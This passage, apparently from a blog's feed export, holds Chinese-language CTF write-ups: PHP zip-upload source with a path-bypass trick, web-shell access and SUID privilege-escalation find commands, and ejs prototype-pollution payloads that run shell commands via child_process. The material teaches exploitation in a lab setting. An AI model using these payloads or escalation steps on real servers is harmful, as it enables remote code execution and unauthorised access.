y0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIGZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=</code></pre><p>base64解码得到</p><pre class=" language-php"><code class="language-php">upload<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"zip.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">"zip"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"only zip!!"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$Myzip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">zip</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$Myzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'./'</span><span class="token punctuation">.</span><span class="token variable">$Myzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Try to unzip your zip to /"</span><span class="token punctuation">.</span><span class="token variable">$Myzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Myzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"Success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"failed"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>zip<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">zip</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$zip_name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$path</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$zip_manager</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$zip_name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_manager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">gen_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_name</span> <span class="token operator">=</span> <span class="token variable">$zip_name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">gen_path</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$chars</span><span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="token punctuation">;</span>        <span class="token variable">$newchars</span><span class="token operator">=</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token variable">$newchars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$chars_key</span><span class="token operator">=</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token variable">$newchars</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fnstr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$fnstr</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$newchars</span><span class="token punctuation">[</span><span class="token variable">$chars_key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$fnstr</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">microtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//先删除目录下的文件：</span>        <span class="token variable">$dh</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">dir_list</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$directory</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_name</span><span class="token punctuation">;</span>        <span class="token variable">$white_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">,</span><span class="token string">'bmp'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_manager</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token markup">&lt; $this-></span>zip_manager<span class="token operator">-</span><span class="token operator">></span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_manager</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNameIndex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you bad bad"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">zip_manager</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Unzip to /"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/ failed"</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dir_list</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"dir? I deleted all things in it"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>@<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">deldir</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"only image!!! I deleted it for you"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>大致审计之后，发现可以用p神之前发的漏洞，将压缩包中的文件名中加入/可以使压缩包<br><img src="https://kingofkb.github.io/medias/image/20220701/change.png"><br>上传更改的压缩包，发现失败。<br><img src="https://kingofkb.github.io/medias/image/20220701/fail.png"><br>用蚁剑连接，找到flag，点进去却没有flag，考虑是权限问题，尝试用suid提权。<br><img src="https://kingofkb.github.io/medias/image/20220701/suid.png"><br>发现nl可用，用nl读取flag<br><img src="https://kingofkb.github.io/medias/image/20220701/nl.png"><br>这部分参考<a href="https://blog.csdn.net/weixin_43610673/article/details/125038199">https://blog.csdn.net/weixin_43610673/article/details/125038199</a></p><pre class=" language-linux"><code class="language-linux">find /bin -perm -u=s -type f 2>/dev/nullfind /usr -perm -u=s -type f 2>/dev/nullfind / -user root -perm -4000 -print 2>/dev/nullfind / -perm -u=s -type f 2>/dev/null</code></pre><p>得到flag:Dest0g3{f5bdea16-8395-434d-8df9-781c2e983b15}</p><h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p>下载附件得到源码。</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">5000</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span>extended<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> merge<span class="token operator">=</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> source<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> target <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">var</span> source <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> source<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>看出是ejs rce。<br>先看原链型污染的内容<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击</a>。<br><a href="https://blog.csdn.net/weixin_43610673/article/details/123171227">node.js原型链污染漏洞</a><br>一些RCE的payload<a href="https://www.anquanke.com/post/id/236354?from=timeline">关于nodejs的ejs和jade模板引擎的原型链污染挖掘 </a></p><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span>"a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//"}}}</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span><span class="token string">"__tmp1; return global.process.mainModule.constructor._load('child_process').execSync('dir'); __tmp2"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"client"</span><span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"escapeFunction"</span><span class="token punctuation">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');"</span><span class="token punctuation">,</span><span class="token string">"compileDebug"</span><span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"client"</span><span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"escapeFunction"</span><span class="token punctuation">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('dir');"</span><span class="token punctuation">,</span><span class="token string">"compileDebug"</span><span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"debug"</span><span class="token punctuation">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>POST传值，注意要加一行Content-type:application/json。<br>得到flag:Dest0g3{a6082f01-c7e2-4ecc-a105-c06c5d5ef899}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022Dest0g3 520迎新赛web复现 SSTI pickle反序列化 pharpop PHP的GC机制 node.js原型链污染 ejs rce zip解压漏洞 suid提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 Ezpop 1题解</title>
      <link href="/2022/05/29/MRCTF2020%20Ezpop%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/05/29/MRCTF2020%20Ezpop%201%E9%A2%98%E8%A7%A3/</url>
      
